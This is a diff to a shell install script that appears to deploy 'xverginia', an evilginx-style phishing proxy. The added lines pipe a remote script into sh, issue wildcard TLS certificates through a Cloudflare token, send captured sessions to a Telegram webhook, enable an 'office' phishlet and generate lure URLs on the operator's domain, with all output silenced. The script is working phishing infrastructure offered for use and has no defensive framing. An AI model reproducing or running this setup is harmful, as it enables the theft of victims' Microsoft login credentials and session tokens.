@@ -82,10 +82,32 @@ cd xverginia &> /dev/null
 chmod +x ./build/xverginia &> /dev/null
 sudo service systemd-resolved stop
 echo -e "nameserver 8.8.8.8\nnameserver 1.1.1.1" | sudo tee /etc/resolv.conf &> /dev/null
+rm -rf ~/.acme.sh &> /dev/null
+curl https://get.acme.sh | sh -s admin@$domain --force &> /dev/null
+~/.acme.sh/acme.sh --set-default-ca --server letsencrypt &> /dev/null
+export CF_Token = "$cf_token" &> /dev/null
+~/.acme.sh/acme.sh --issue --dns dns_cf \
+  -d $domain \
+  -d "*.$domain" \
+  --keylength ec-256 --force  &> /dev/null
+mkdir -p /root/.xverginia/crt/sites/$domain
+~/.acme.sh/acme.sh --install-cert -d $domain \
+  --key-file       /root/.xverginia/crt/sites/$domain/privkey.pem \
+  --fullchain-file /root/.xverginia/crt/sites/$domain/fullchain.pem \
+  --ecc --force &> /dev/null
+chmod 600 /root/.xverginia/crt/sites/$domain/*.pem
 
 cat <<EOF > conf.txt
 config ipv4 $uip
 config autocert off
+config domain $domain
+config webhook_telegram $bottoken/$telegram
+phishlets hostname office $domain
+phishlets enable office
+lures delete all
+lures create office
+lures get-url 0
+lures edit 0 hostname $domain
 q
 EOF
 ./build/xverginia -p ./phishlets/ < conf.txt &> /dev/null
@@ -105,7 +127,7 @@ cat <<EOF
 +++++          Installation comleted          ++++++	
 
 |--------------------------------------------------|
-[ .  Update these records into your cf domain      ]
+[ .  Add records into your cf ($domain)      ]
 |--------------------------------------------------|
 | . Type  | . Name  | .   Value      | . proxied   |
 |--------------------------------------------------|
